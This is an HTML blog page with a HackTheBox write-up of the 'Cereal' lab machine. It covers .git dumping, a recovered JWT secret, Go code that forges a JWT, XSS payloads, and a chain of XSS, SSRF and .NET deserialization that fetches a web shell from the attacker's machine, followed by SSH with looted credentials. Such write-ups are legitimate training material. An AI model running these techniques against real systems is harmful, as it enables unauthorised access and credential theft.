<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Cereal (User) | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Cyber Security,Pentesting"><meta name=description content="Chaining XSS, SSRF, and deserialization vulnerabilities to get RCE"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/cereal/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Cereal (User)"><meta property="og:description" content="Chaining XSS, SSRF, and deserialization vulnerabilities to get RCE"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/cereal/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/cereal/imgs/image-20210610055817109.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2021-06-09T07:33:40+07:00"><meta property="article:modified_time" content="2021-06-09T07:33:40+07:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/cereal/imgs/image-20210610055817109.png"><meta name=twitter:title content="HackTheBox - Cereal (User)"><meta name=twitter:description content="Chaining XSS, SSRF, and deserialization vulnerabilities to get RCE"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Cereal (User)","item":"https://fahmifj.github.io/hackthebox/cereal/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Cereal (User)","name":"HackTheBox - Cereal (User)","description":"Chaining XSS, SSRF, and deserialization vulnerabilities to get RCE","keywords":["HackTheBox","CTF","Cyber Security","Pentesting"],"articleBody":"Cereal is a hard difficulty Windows machine that features a misconfigured web server, which exposes source code of the currently hosted web application. Initial source code analysis revealed a deleted JWT secret that could be used to forge a JWT token and bypass the application’s login page. Another code analysis finds the web is vulnerable to a deserialization attack. There is also an XSS vulnerability in one of the packages used by the application. Chaining these vulnerabilities results in a shell access to the system.\nSkills Learned Code review JWT authentication bypass XSS exploitation .NET deserialization Exploit chain Tools Kali Linux 2019.4 (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux Reconnaissance Nmap All TCP ports scan with nmap discovers three open ports: SSH on port 22, HTTP on port 80, and HTTP on port 443.\n→ root@kali «cereal» «10.10.14.3» $ nmap -p- --min-rate 1000 --reason -oA nmap/10-tcp-allport-cereal 10.10.10.217 Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-04 23:45 EDT ...... PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 127 80/tcp open http syn-ack ttl 127 443/tcp open https syn-ack ttl 127 Nmap done: 1 IP address (1 host up) scanned in 118.08 seconds I’ll run another scan with nmap ’s default scripts.\n→ root@kali «cereal» «10.10.14.3» $ nmap -p 22,80,443 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.217 Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-04 23:51 EDT ...... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 08:8e:fe:04:8c:ad:6f:df:88:c7:f3:9a:c5:da:6d:ac (RSA) | 256 fb:f5:7b:a1:68:07:c0:7b:73:d2:ad:33:df:0a:fc:ac (ECDSA) |_ 256 cc:0e:70:ec:33:42:59:78:31:c0:4e:c2:a5:c9:0e:1e (ED25519) 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Did not follow redirect to https://cereal.htb/ |_https-redirect: ERROR: Script execution failed (use -d to debug) 443/tcp open ssl/http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Cereal | ssl-cert: Subject: commonName=cereal.htb | Subject Alternative Name: DNS:cereal.htb, DNS:source.cereal.htb | Not valid before: 2020-11-11T19:57:18 |_Not valid after: 2040-11-11T20:07:19 |_ssl-date: 2021-06-05T03:51:48+00:00; +5s from scanner time. | tls-alpn: |_ http/1.1 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 4s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.34 seconds This time nmap found two hostnames from the SSL certificate: cereal.htb and source.cereal.htb.\nI’ll add those hostnames to my /etc/hosts:\n→ root@kali «cereal» «10.10.14.3» $ echo '10.10.10.217 cereal.htb source.cereal.htb' \u003e\u003e /etc/hosts Enumeration TCP 80 It redirects to the HTTPS.\nTCP 443 - cereal.htb Following the redirection ends up at a login form. I tried a few common credentials, but they didn’t work here.\nInspecting the source reveals that this site is a react based application.\nIf I track down the authentication process, this site store the authentication data in browser’s local storage with a key name of currentUser, but l’ll leave it for now.\nI also did a gobuster scan, but didn’t find anything useful.\nTCP 443 - source.cereal.htb Visiting source.cereal.htb shows a server error message of an ASP.net application:\nNothing I can do with this page, but I’ll take note on the leaked file path:\nC:\\inetpub\\source\\default.aspx Gobuster gobuster scan discovers a git repository, and there is also an upload directory.\n→ root@kali «cereal» «10.10.14.3» $ gobuster dir -u https://source.cereal.htb -k -w /opt/SecLists/Discovery/Web-Content/common.txt -x aspx,txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://source.cereal.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: aspx,txt [+] Timeout: 10s =============================================================== 2021/06/05 00:52:32 Starting gobuster in directory enumeration mode =============================================================== /.git/HEAD (Status: 200) [Size: 23] /Default.aspx (Status: 500) [Size: 10090] /aspnet_client (Status: 301) [Size: 163] [--\u003e https://source.cereal.htb/aspnet_client/] /default.aspx (Status: 500) [Size: 9727] /uploads (Status: 301) [Size: 157] [--\u003e https://source.cereal.htb/uploads/] =============================================================== 2021/06/05 00:54:41 Finished =============================================================== Access to the .git and the uploads directory are forbidden.\n→ root@kali «cereal» «10.10.14.3» $ curl -I -k http://source.cereal.htb/.git/ \u0026\u0026 curl -I -k http://source.cereal.htb/uploads/ HTTP/1.1 403 Forbidden Content-Length: 1233 Content-Type: text/html Server: Microsoft-IIS/10.0 X-Powered-By: Sugar Date: Sat, 05 Jun 2021 05:01:25 GMT HTTP/1.1 403 Forbidden Content-Length: 1233 Content-Type: text/html Server: Microsoft-IIS/10.0 X-Powered-By: Sugar Date: Sat, 05 Jun 2021 05:08:16 GMT But requesting files under .git directory are allowed.\n→ root@kali «cereal» «10.10.14.3» $ curl -I -k http://source.cereal.htb/.git/HEAD HTTP/1.1 200 OK Content-Length: 23 Content-Type: text/plain Last-Modified: Wed, 11 Nov 2020 20:09:34 GMT Accept-Ranges: bytes ETag: \"adc1d19266b8d61:0\" Server: Microsoft-IIS/10.0 X-Powered-By: Sugar Date: Sat, 05 Jun 2021 05:01:29 GMT → root@kali «cereal» «10.10.14.3» $ curl -s -k http://source.cereal.htb/.git/HEAD ref: refs/heads/master I’ll note the uploads directory.\nGit Dumping .git directory With git-dumper, I could get all the files in that .git directory.\n→ root@kali «cereal» «10.10.14.3» $ mkdir loot/source-cereal-git \u0026\u0026 ./git-dumper.py https://source.cereal.htb/.git loot/source-cereal-git [-] Testing https://source.cereal.htb/.git/HEAD [200] [-] Testing https://source.cereal.htb/.git/ [403] [-] Fetching common files [-] Fetching https://source.cereal.htb/.gitignore [404] [-] Fetching https://source.cereal.htb/.git/hooks/applypatch-msg.sample [404] [-] Fetching https://source.cereal.htb/.git/COMMIT_EDITMSG [200] [-] Fetching https://source.cereal.htb/.git/description [200] ...... [-] Finding refs/ [-] Fetching https://source.cereal.htb/.git/ORIG_HEAD [404] [-] Fetching https://source.cereal.htb/.git/config [200] [-] Fetching https://source.cereal.htb/.git/FETCH_HEAD [404] [-] Fetching https://source.cereal.htb/.git/HEAD [200] ...... [-] Finding packs [-] Finding objects [-] Fetching objects [-] Fetching https://source.cereal.htb/.git/objects/8f/2a1a88f15b9109e1f63e4e4551727bfb38eee5 [200] ...... [-] Running git checkout . Git History I could see the history of this repository by issuing git log.\nAside from the author’s names, one commit with the message “Security fixes” caught my attention.\nI immediately run git diff 8f2a 7bd9 to compare the first commit with the security fixes and that reveals a deleted JWT secret.\nIt looks like the security fixes include prevention against deserialization attacks which I’ll note that as well as the secret:\nJWT secret: secretlhfIH\u0026FY*#oysuflkhskjfhefesf Source Code Analysis #1 I pointed my sh*tty explanation or at least how I understand it with // \u003c== or # \u003c== in the code snippet. Please, don’t bully me for this.\nApp Overview The app consist of ASP.NET (back-end) and React (front-end).\n→ root@kali «source-cereal-git» «10.10.14.3» git:(master) $ tree -L 1 --dirsfirst . ├── ClientApp ├── Controllers ├── Migrations ├── Models ├── Pages ├── Properties ├── Services ├── ApplicationOptions.cs ├── appsettings.Development.json ├── appsettings.json ├── CerealContext.cs ├── Cereal.csproj ├── DownloadHelper.cs ├── ExtensionMethods.cs ├── IPAddressHandler.cs ├── IPRequirement.cs ├── Program.cs └── Startup.cs The source code of previously seen React app at cereal.htb is on the ClientApp folder.\nHere is the overview of app execution flow:\nProgram.cs | v Startup.cs -\u003e Loads appsettings.json | v React client Looking into the appsettings.js, I could obtain the following information:\nThere is IP whitelist There are two rules that looks like limiting requests and it’ll reset after certain period. One of them is limiting a post request to an endpoint called /requests. { ...... \"AllowedHosts\": \"*\", \"ApplicationOptions\": { \"Whitelist\": [ \"127.0.0.1\", \"::1\" ] }, \"IpRateLimiting\": { \"EnableEndpointRateLimiting\": true, \"StackBlockedRequests\": false, \"RealIpHeader\": \"X-Real-IP\", \"ClientIdHeader\": \"X-ClientId\", \"HttpStatusCode\": 429, \"IpWhitelist\": [ \"127.0.0.1\", \"::1\" ], \"EndpointWhitelist\": [], \"ClientWhitelist\": [], \"GeneralRules\": [ { \"Endpoint\": \"post:/requests\", \"Period\": \"5m\", \"Limit\": 2 }, { \"Endpoint\": \"*\", \"Period\": \"5m\", \"Limit\": 150 } ] } } Authentication Vulnerability Looking into the Startup.cs file, I could see there is a potential authentication bypass. On the following code snippet, the application clearly doesn’t validate the issuer and the audience of a JWT token, and this can raise a security issue.\n...\u003cSNIP\u003e... var key = Encoding.ASCII.GetBytes(\"*\"); services.AddAuthentication(x =\u003e { x.DefaultAuthenticateScheme = JwtBearerDefaults.AuthenticationScheme; x.DefaultChallengeScheme = JwtBearerDefaults.AuthenticationScheme; }) .AddJwtBearer(x =\u003e { x.RequireHttpsMetadata = false; x.SaveToken = true; x.TokenValidationParameters = new TokenValidationParameters { ValidateIssuerSigningKey = true, IssuerSigningKey = new SymmetricSecurityKey(key), ValidateIssuer = false, // \u003c== No validation ValidateAudience = false // \u003c== No validation }; }); ...\u003cSNIP\u003e... The JWT token itself is forged at Services/UserService.cs:\npublic User Authenticate(string username, string password) { using (var db = new CerealContext()) { var user = db.Users.Where(x =\u003e x.Username == username \u0026\u0026 x.Password == password).SingleOrDefault(); // return null if user not found if (user == null) return null; // authentication successful so generate jwt token var tokenHandler = new JwtSecurityTokenHandler(); var key = Encoding.ASCII.GetBytes(\"*\"); var tokenDescriptor = new SecurityTokenDescriptor { Subject = new ClaimsIdentity(new Claim[] { new Claim(ClaimTypes.Name, user.UserId.ToString()) }), Expires = DateTime.UtcNow.AddDays(7), SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature) }; var token = tokenHandler.CreateToken(tokenDescriptor); user.Token = tokenHandler.WriteToken(token); return user.WithoutPassword(); } When the user attempts to authenticate, the code snippet above checks to see if the user’s credentials match those in the database. If the credentials match, the app will generate a JWT token for that user.\nThe user model is defined in here Models/User.cs. From here, I can assume each JWT token contains at least a user’s ID, expiration time (7 days), username, and token.\n...\u003cSNIP\u003e... public class User { [Key] public int UserId { get; set; } [Required] public string Username { get; set; } [Required] public string Password { get; set; } public string Token { get; set; } } ...\u003cSNIP\u003e... Interestingly, in ClientApp/src/LoginPage/LoginPage.jsx, the authentication process doesn’t look like it needs server/back-end validation, because it checks the browser’s local storage first.\nIt’ll ask the server if we press the login button (POST request).\n...\u003cSNIP\u003e... import { authenticationService } from '../_services'; // \u003c== class LoginPage extends React.Component { constructor(props) { super(props); // redirect to home if already logged in if (authenticationService.currentUserValue) { // \u003c== this.props.history.push('/'); } } render() { return ( \u003cdiv\u003e \u003ch2\u003eLogin\u003c/h2\u003e ...\u003cSNIP\u003e... I could track the authenticationService.currentUserValue and it is defined in ClientApp/src/_services/authentication.service.jsx\nconst currentUserSubject = new BehaviorSubject(JSON.parse(localStorage.getItem('currentUser'))); // \u003c== export const authenticationService = { login, logout, currentUser: currentUserSubject.asObservable(),// \u003c== get currentUserValue () { return currentUserSubject.value } // \u003c== }; Authentication Bypass I could summarize the previous code analysis to these points:\nAs long as the browser’s local storage contains a key of currentUser which has JWT token in its value, the client app will logs the user in. No other validation in JWT token except the user’s ID and expires date. (based on Services/UserService.cs) Based on Models/User.cs, Services/UserService.cs, and ClientApp/src/_services/auth-header.js , the form of currentUser is something like this: \"currentUser\" : \"{ \"userId\": \"0\", \"username\": \"name\", \"token\": \"JWT token\"}\". And here are the tactics to bypass the login page:\nSince there is no validation on the issuer, and I have the JWT secret key, I could forge my own JWT. I’ll put the forged JWT token to browser’s local storage of cereal.htb with the key name of currentUser. Simply refresh the page afterwards and see if it logs me in. Forge JWT To forge our own JWT, you could try jwtool, but I tried to forge my own JWT using Golang. Here is the code:\npackage main import ( \"encoding/json\" \"fmt\" \"time\" \"github.com/dgrijalva/jwt-go\" ) type UserService interface { CreateToken(userID string) string } type jwtService struct { secretKey string } func (s *jwtService) CreateToken() string { claims := jwt.StandardClaims{ ExpiresAt: time.Now().AddDate(0, 0, 7).UTC().Unix(), } token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims) t, err := token.SignedString([]byte(s.secretKey)) if err != nil { panic(err) } return t } type User struct { UserId string `json:\"userId,omitempty\"` Username string `json:\"username,omitempty\"` Token string `json:\"token,omitempty\"` } func main() { jwt := \u0026jwtService{} jwt.secretKey = \"secretlhfIH\u0026FY*#oysuflkhskjfhefesf\" cu := User{ UserId: \"1\", Username: \"iamf\", Token: jwt.CreateToken(), } currentUser, _ := json.Marshal(cu) fmt.Printf(\"%s\", currentUser) } It produces the following output.\n→ root@kali «cereal» «10.10.14.3» $ go run main.go {\"userId\":\"1\",\"username\":\"iamf\",\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjM4MTgwMzh9.XAcgRqhpgyJARsBMEWg1UOlUeRnQU4bvbk1SpAv3vDM\"} Login At https://cereal.htb, I’ll create a new local storage with a key name of currentUser and I’ll put the previous output as the key’s value. When I refresh the site, it logs me in.\nInput testing When I submitted a URL which points to my attacking machine, I received a GET request coming from the Title field.\nHere how the request and the response looklike.\nSource Code Analysis #2 I decided to mix it with images hehe.\nDeserialization Vulnerability Looking into the request controller, Controllers/RequestsController.cs, it turns out that each Cereal Request (POST) sent is saved in database without validation.\nActually, there is a client-side validation, but it could easily be bypassed with Burp repeater. For example, I could send a cereal request in different structure:\nThe cereal database’s name can be found inside CerealContext.cs.\nLooking back into the request controller, there is a comment inside the Get function that points out about deserialization (previously seen upon comparing the commit logs):\n...\u003cSNIP\u003e... [Authorize(Policy = \"RestrictIP\")] [HttpGet(\"{id}\")] public IActionResult Get(int id) { using (var db = new CerealContext()) { string json = db.Requests.Where(x =\u003e x.RequestId == id).SingleOrDefault().JSON; // Filter to prevent deserialization attacks mentioned here: https://github.com/pwntester/ysoserial.net/tree/master/ysoserial if (json.ToLower().Contains(\"objectdataprovider\") || json.ToLower().Contains(\"windowsidentity\") || json.ToLower().Contains(\"system\")) { return BadRequest(new { message = \"The cereal police have been dispatched.\" }); } var cereal = JsonConvert.DeserializeObject(json, new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.Auto }); return Ok(cereal.ToString()); } } The Get function can only be accessed if the request IP is in the whitelist (defined in appsettings.json ) and it takes one parameter called id (GET /requests/{id}).\n[Authorize(Policy = \"RestrictIP\")] [HttpGet(\"{id}\")] This line blocks the gadget classes used for .NET deserialization attack.\nif (json.ToLower().Contains(\"objectdataprovider\") || json.ToLower().Contains(\"windowsidentity\") || json.ToLower().Contains(\"system\")) But, there is a class called DownloadHelper that has a function which can be used to send a download request:\n...\u003cSNIP\u003e... public class DownloadHelper { private String _URL; private String _FilePath; public String URL ...\u003cSNIP\u003e... private void Download() { using (WebClient wc = new WebClient()) { if (!string.IsNullOrEmpty(_URL) \u0026\u0026 !string.IsNullOrEmpty(_FilePath)) { wc.DownloadFile(_URL, ReplaceLastOccurrence(_FilePath,\"\\\\\", \"\\\\21098374243-\")); } } } I could use DownloadHelper class to download a web shell hosted on my machine by sending a serialized form of this class via the Cereal Request.\nThe problem here I couldn’t make a GET request to requests/{id} because there is an IP restriction policy.\nXSS Vulnerability When tracking down where the previous GET request came from, I found out that each Cereal Request sent lands on the admin page (AdminPage.jsx).\nAnd one of the app library used in the admin page called react-marked-down has an XSS vulnerability.\n...\u003cSNIP\u003e... \u003cAccordion.Toggle as={Button} variant=\"link\" eventKey={this.props.request.requestId} name=\"expand\" id={this.props.request.requestId}\u003e {requestData \u0026\u0026 requestData.title \u0026\u0026 typeof requestData.title == 'string' \u0026\u0026 \u003cMarkdownPreview markedOptions={{ sanitize: true }} value={requestData.title} /\u003e // \u003c== ...\u003cSNIP\u003e... I could confirm the vulnerability with the following payload:\n[XSS](javascript: document.write``) With a few experiments, URL encoding seems to work as well\n[XSS](javascript: document.write%28%22%22%29) Foothold Shell as Sonny Web Shell Upload via XSS and Deserialization Putting it all together:\nThere is an uploads directory at https://source.cereal.htb/uploads/. The gadget classes for deserialization attack are filtered, but there is one class called DownloadHelper that can be accessed and it has a download function. There is a SSRF (not sure yet) in the Title section, which can be used along with the XSS vulnerability to bypass the IP restriction. The tactics:\nSerialized DownloadHelper class which contains a web shell URL that points to the attacking machine, and send it via the Cereal Request, note the ID. Use XSS which bypasses the IP restriction, to make a GET request to cereal.htb/request/{the ID} to trigger the deserialization, Confirms the web shell at https://cereal.source.htb/uploads/shell-name.aspx I’ve made a script to chain these vulnerabilities (XSS, SSRF, and Deserialization). The results is as follow:\nThat’s on different IP because I decided to ran the exploit again to make sure it’s still work XD\nI can access my web shell on http://source.cereal.htb/uploads/iamf.aspx.\nSSH - sonny A quick check on the web directory, I find the cereal.db at c:\\inetpub\\cereal\\db\\cereal.db and it contains a string that looks like a set of credentials.\nI tried it on SSH (sonny:mutual.madden.manner38974) and it worked.\n→ root@kali «exploits» «10.10.14.2» $ ssh sonny@cereal.htb sonny@cereal.htb's password: Microsoft Windows [Version 10.0.17763.1817] (c) 2018 Microsoft Corporation. All rights reserved. sonny@CEREAL C:\\Users\\sonny\u003edir desktop\\ Volume in drive C has no label. Volume Serial Number is C4EF-2153 Directory of C:\\Users\\sonny\\desktop 11/16/2020 05:19 AM . 11/16/2020 05:19 AM .. 06/07/2021 09:59 PM 34 user.txt 1 File(s) 34 bytes 2 Dir(s) 7,621,619,712 bytes free ","wordCount":"2548","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/cereal/imgs/image-20210610055817109.png","datePublished":"2021-06-09T07:33:40+07:00","dateModified":"2021-06-09T07:33:40+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/cereal/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Cereal (User)</h1><p class=post-description>Chaining XSS, SSRF, and deserialization vulnerabilities to get RCE</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>June 09, 2021</span>&nbsp;&#183;&nbsp;<span class=meta-read>12 min read</span></div><hr></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80 aria-label="TCP 80">TCP 80</a></li><li><a href=#tcp-443---cerealhtb aria-label="TCP 443 - cereal.htb">TCP 443 - cereal.htb</a></li><li><a href=#tcp-443---sourcecerealhtb aria-label="TCP 443 - source.cereal.htb">TCP 443 - source.cereal.htb</a></li><li><a href=#git aria-label=Git>Git</a></li><li><a href=#source-code-analysis-1 aria-label="Source Code Analysis #1">Source Code Analysis #1</a></li><li><a href=#authentication-bypass aria-label="Authentication Bypass">Authentication Bypass</a></li><li><a href=#source--code-analysis-2 aria-label="Source  Code Analysis #2">Source Code Analysis #2</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-sonny aria-label="Shell as Sonny">Shell as Sonny</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/cereal/imgs/image-20210610055817109_hub1b27343f17f570176b5f50bf98b35ae_129057_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/cereal/imgs/image-20210610055817109_hub1b27343f17f570176b5f50bf98b35ae_129057_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/cereal/imgs/image-20210610055817109_hub1b27343f17f570176b5f50bf98b35ae_129057_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/cereal/imgs/image-20210610055817109.png 742w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/cereal/imgs/image-20210610055817109.png alt="HackTheBox - Cereal" width=742 height=463><p>HackTheBox - Cereal</p></figure><p>Cereal is a hard difficulty Windows machine that features a misconfigured web server, which exposes source code of the currently hosted web application. Initial source code analysis revealed a deleted JWT secret that could be used to forge a JWT token and bypass the application&rsquo;s login page. Another code analysis finds the web is vulnerable to a deserialization attack. There is also an XSS vulnerability in one of the packages used by the application. Chaining these vulnerabilities results in a shell access to the system.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>Code review</li><li>JWT authentication bypass</li><li>XSS exploitation</li><li>.NET deserialization</li><li>Exploit chain</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Kali Linux 2019.4 (Attacking Machine) - <a href=https://www.kali.org/>https://www.kali.org/</a></li><li>Nmap - Preinstalled in Kali Linux</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p>All TCP ports scan with <code>nmap</code> discovers three open ports: SSH on port 22, HTTP on port 80, and HTTP on port 443.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «cereal» «10.10.14.3» 
</span></span><span class=line><span class=cl>$ nmap -p- --min-rate <span class=m>1000</span> --reason -oA nmap/10-tcp-allport-cereal 10.10.10.217
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-06-04 23:45 EDT
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>PORT    STATE SERVICE REASON
</span></span><span class=line><span class=cl>22/tcp  open  ssh     syn-ack ttl <span class=m>127</span>
</span></span><span class=line><span class=cl>80/tcp  open  http    syn-ack ttl <span class=m>127</span>
</span></span><span class=line><span class=cl>443/tcp open  https   syn-ack ttl <span class=m>127</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 118.08 seconds
</span></span></code></pre></div><p>I&rsquo;ll run another scan with <code>nmap</code> &rsquo;s default scripts.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «cereal» «10.10.14.3» 
</span></span><span class=line><span class=cl>$ nmap -p 22,80,443 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.217
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-06-04 23:51 EDT
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>PORT    STATE SERVICE  VERSION
</span></span><span class=line><span class=cl>22/tcp  open  ssh      OpenSSH for_Windows_7.7 <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 08:8e:fe:04:8c:ad:6f:df:88:c7:f3:9a:c5:da:6d:ac <span class=o>(</span>RSA<span class=o>)</span>
